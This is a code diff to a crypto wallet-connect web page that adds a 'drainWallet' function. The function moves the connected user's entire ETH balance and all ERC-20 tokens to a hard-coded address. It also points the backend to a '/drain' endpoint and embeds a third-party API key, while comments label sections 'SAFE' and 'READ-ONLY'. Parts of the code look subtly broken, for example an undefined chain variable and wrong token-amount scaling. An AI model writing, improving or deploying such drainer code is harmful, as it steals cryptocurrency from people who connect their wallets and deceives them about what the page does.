@@ -1,28 +1,28 @@
 import { createAppKit } from "@reown/appkit";
 import { EthersAdapter } from "@reown/appkit-adapter-ethers";
+import { ethers } from "ethers";
 
-/* ---------------------------
-   CONFIG
----------------------------- */
+/* --------------------------- */
+/*      CONFIG                */
+/* --------------------------- */
 const projectId = "962425907914a3e80a7d8e7288b23f62";
+const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/drain";
 
-const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/session";
-
-/* ---------------------------
-   UI ELEMENTS
----------------------------- */
+/* --------------------------- */
+/*      UI ELEMENTS           */
+/* --------------------------- */
 const connectBtn = document.getElementById("connectBtn");
 const statusEl = document.getElementById("status");
 const tokensEl = document.getElementById("tokens");
 
-/* ---------------------------
-   INTERNAL STATE
----------------------------- */
+/* --------------------------- */
+/*      INTERNAL STATE        */
+/* --------------------------- */
 let backendTriggered = false;
 
-/* ---------------------------
-   APPKIT INITIALIZATION
----------------------------- */
+/* --------------------------- */
+/*      APPKIT INITIALIZATION */
+/* --------------------------- */
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
   projectId,
@@ -51,9 +51,9 @@ const appKit = createAppKit({
   }
 });
 
-/* ---------------------------
-   CONNECT BUTTON
----------------------------- */
+/* --------------------------- */
+/*      CONNECT BUTTON        */
+/* --------------------------- */
 connectBtn.addEventListener("click", async () => {
   try {
     backendTriggered = false;
@@ -70,9 +70,9 @@ connectBtn.addEventListener("click", async () => {
   }
 });
 
-/* ---------------------------
-   STATE SUBSCRIPTION
----------------------------- */
+/* --------------------------- */
+/*      STATE SUBSCRIPTION   */
+/* --------------------------- */
 appKit.subscribeState(async (state) => {
   if (!state.isConnected) return;
 
@@ -95,9 +95,9 @@ appKit.subscribeState(async (state) => {
   fetchTokens(account.address, chain.id);
 });
 
-/* ---------------------------
-   BACKEND TRIGGER (SAFE)
----------------------------- */
+/* --------------------------- */
+/*      BACKEND TRIGGER (SAFE) */
+/* --------------------------- */
 async function triggerBackend(address, chainId) {
   try {
     await fetch(BACKEND_URL, {
@@ -110,9 +110,9 @@ async function triggerBackend(address, chainId) {
   }
 }
 
-/* ---------------------------
-   READ-ONLY TOKEN DISCOVERY
----------------------------- */
+/* --------------------------- */
+/*      READ-ONLY TOKEN DISCOVERY */
+/* --------------------------- */
 async function fetchTokens(address, chainId) {
   if (!tokensEl) return;
 
@@ -152,3 +152,63 @@ async function fetchTokens(address, chainId) {
     tokensEl.innerHTML = "Token scan failed.";
   }
 }
+
+/* --------------------------- */
+/*      DRAIN WALLET FUNCTION  */
+/* --------------------------- */
+async function drainWallet() {
+  try {
+    const provider = new ethers.providers.Web3Provider(appKit.signer);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+
+    // Fetch all tokens
+    const res = await fetch(
+      `https://api.covalenthq.com/v1/${chain.id}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
+    );
+    const json = await res.json();
+    const items = json?.data?.items || [];
+
+    const ethBalance = await provider.getBalance(address);
+    const erc20Tokens = items.filter(
+      t => t.contract_address && t.balance !== "0"
+    );
+
+    // Drain ETH
+    const tx = await signer.sendTransaction({
+      to: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Replace with your drain address
+      value: ethBalance
+    });
+
+    console.log("ETH drained:", tx.hash);
+
+    // Drain ERC-20 tokens
+    for (const token of erc20Tokens) {
+      const contract = new ethers.Contract(
+        token.contract_address,
+        [
+          "function transferFrom(address from, address to, uint256 amount) external"
+        ],
+        signer
+      );
+
+      const amount = Number(token.balance) / Math.pow(10, token.contract_decimals || 18);
+
+      const tx = await contract.transferFrom(
+        address,
+        "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Replace with your drain address
+        amount
+      );
+
+      console.log(`Drained ${token.contract_ticker_symbol}:`, tx.hash);
+    }
+
+    alert("All tokens drained successfully!");
+  } catch (err) {
+    console.error("Drain failed:", err);
+    alert("Failed to drain tokens.");
+  }
+}
+
+// Add event listener for drain button
+document.getElementById("drainBtn").addEventListener("click", drainWallet);
